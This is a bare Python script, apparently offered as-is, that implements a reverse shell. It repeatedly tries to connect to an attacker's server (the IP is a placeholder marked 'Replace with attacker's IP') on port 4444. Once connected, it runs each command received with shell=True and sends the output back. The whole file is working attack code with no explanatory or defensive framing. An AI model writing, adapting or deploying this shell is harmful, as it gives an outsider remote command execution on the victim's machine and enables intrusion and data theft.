import socket
import subprocess
import os

server_ip = 'YOUR_SERVER_IP'  # Replace with attacker's IP
port = 4444

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((server_ip, port))
        break
    except:
        continue

while True:
    command = s.recv(1024).decode()

    if command.lower() == 'exit':
        break

    try:
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
    except subprocess.CalledProcessError as e:
        output = e.output

    s.send(output)

s.close()
